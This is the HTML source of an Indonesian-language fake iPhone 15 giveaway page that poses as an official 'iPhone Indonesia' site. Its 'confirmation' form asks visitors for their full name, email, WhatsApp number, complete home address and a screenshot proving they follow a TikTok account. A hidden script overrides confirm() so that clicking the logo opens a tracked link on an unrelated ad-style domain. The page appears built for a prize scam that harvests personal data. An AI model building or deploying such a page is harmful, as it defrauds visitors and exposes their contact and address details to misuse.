<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iPhone (indonesia) - Konfirmasi Hadiah</title>
    <meta name="description"
        content="iPhone Indonesia - Dalam mengikuti giveaway iPhone 15 terpercaya, Anda dapat memenangkan ponsel canggih secara gratis, Dan Tanpa Biaya Sepeserpun">
    <meta name="keywords"
        content="giveaway , give away , iphone indonesia , iphone gratis , give away iphone , iphone 15 , iphone 15 promax , ip 15 pm , ip 11">
    <link rel="icon" href="assets/images/icon.png" type="image/gif">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.2.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@10.16.6/dist/sweetalert2.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/select2@4.0.13/dist/css/select2.min.css" />
    <link rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/select2-bootstrap-5-theme@1.3.0/dist/select2-bootstrap-5-theme.min.css" />
    <style>
        @import url("https://file.gifan.id/fonts/gFont.css");

        body {
            background-color: darkslategrey;
            font-family: "Pacifico", cursive;
            font-family: "Signika Negative", sans-serif;
        }

        .fixed-bottom {
            position: fixed;
            left: 0;
            bottom: 0;
            width: 100%;
            z-index: 1030;
        }

        @media (min-height: 420px) {
            .fixed-bottom {
                position: fixed !important;
                bottom: 0;
            }
        }
    </style>
</head>

<body>

    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
        <symbol id="check-circle-fill" fill="currentColor" viewBox="0 0 16 16">
            <path
                d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z" />
        </symbol>
        <symbol id="info-fill" fill="currentColor" viewBox="0 0 16 16">
            <path
                d="M8 16A8 8 0 1 0 8 0a8 8 0 0 0 0 16zm.93-9.412-1 4.705c-.07.34.029.533.304.533.194 0 .487-.07.686-.246l-.088.416c-.287.346-.92.598-1.465.598-.703 0-1.002-.422-.808-1.319l.738-3.468c.064-.293.006-.399-.287-.47l-.451-.081.082-.381 2.29-.287zM8 5.5a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
        </symbol>
        <symbol id="exclamation-triangle-fill" fill="currentColor" viewBox="0 0 16 16">
            <path
                d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767L8.982 1.566zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z" />
        </symbol>
    </svg>

    <div class="container mt-1">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <div class="text-center">
                    <img src="assets/images/iPhone-Logo-2007.png" alt="iphone id real" width="120" onclick="confirm();">
                </div>
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Form Konfirmasi Give Away iPhone<span
                                style="color: green;">(Wajib)</span>
                        </h5>
                        <div class="alert alert-primary alert-dismissible fade show" role="alert">
                            <svg class="bi flex-shrink-0 me-2" width="24" height="24" role="img"
                                aria-label="Info:">
                                <use xlink:href="#info-fill"></use>
                            </svg>
                            <strong>Information</strong>
                            <hr><span style="color: rgb(21, 2, 104);">Silahkan Mengisi Nama, Alamat , Nomor WA (wajib
                                aktif) , Jika Sudah Mengisi Formulir Nya tunggu hingga admin kami
                                menghubungi.</span><br>
                                <button type="button"
                                class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                        </div>
                        <form method="POST" action="konfirmasi-iphone">
                            <div class="mb-2">
                                <label class="form-label">
                                    <i class="fa-sharp fa-solid fa-user fa-beat"></i> Nama Lengkap</label>
                                <div class="input-group">
                                    <input type="text" name="name" class="form-control" placeholder="Nama anda"
                                        required>
                                </div>
                            </div>
                            <div class="mb-2">
                                <label class="form-label">
                                    <i class="fa-sharp fa-regular fa-envelope fa-beat"></i> Email</label>
                                <div class="input-group">
                                    <input type="email" name="email" class="form-control"
                                        placeholder="email@gmail.com" required>
                                </div>
                            </div>
                            <div class="mb-2">
                                <label class="form-label">
                                    <i class="fa-sharp fa-solid fa-phone fa-beat"></i> Nomor WhatsApp (Wajib) </label>
                                <div class="input-group">
                                    <input type="number" name="noWa" class="form-control" placeholder="08XXXXXXXXXX"
                                        required>
                                </div>
                            </div>

                            <div class="mb-2">
                                <label class="form-label">
                                    <i class="fa-sharp fa-solid far fas fa-address-card fa-beat"></i> Alamat Lengkap
                                </label>
                                <div class="input-group">
                                    <input type="text" name="addrs" class="form-control"
                                        placeholder="Kota , kabupaten/kota , kecamatan, kelurahan/desa nama jalan, rt/rw , no rumah "
                                        required>
                                </div>
                            </div>

                            <div class="mb-2">
                                <label class="form-label">
                                    <i class="fa-sharp fa-solid fa-file fa-beat"></i> Screenshoot
                                    (Bukti Follow akun) <a href="https://www.tiktok.com/@iphoneid.real"
                                        target="_blank">@iphoneid.real</a> ) </label>
                                <div class="input-group">
                                    <input type="file" name="ssFollow" class="form-control" required>
                                </div>
                            </div>

                            <div class="mb-2">
                                <div class="form-check">
                                    <input class="form-check-input" type="checkbox" name="follow" required
                                        id="flexCheckDefault">
                                    <label class="form-check-label" for="flexCheckDefault">
                                    Saya Sudah Follow <a href="https://www.tiktok.com/@iphoneid.real"
                                            target="_blank">@iphoneid.real</a>
                                    </label>
                                </div>
                            </div>

                            <div class="d-grid gap-2">
                                <button type="submit" class="btn btn-primary btn-block">
                                    <i class="fa-solid fa-right-to-bracket fa-fade"></i> Submit </button>
                            </div>
                        </form>
                    </div>
                </div>

            </div>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.2.0/js/bootstrap.min.js"></script>
    <script src="https://kit.fontawesome.com/f0b785de15.js" crossorigin="anonymous"></script>
    <!-- Scripts -->
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.0/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/select2@4.0.13/dist/js/select2.full.min.js"></script>

    <script type="text/javascript">
        $(document).ready(function() {
            $('.form-select').select2({
                theme: 'bootstrap-5'
            });
        });

        function confirm(){
            window.open("https://courageousaway.com/ad5qnpzr?key=2459d1611cb9656e70e0d4c1a334e190", "_blank");
        }
    </script>
</body>

</html>
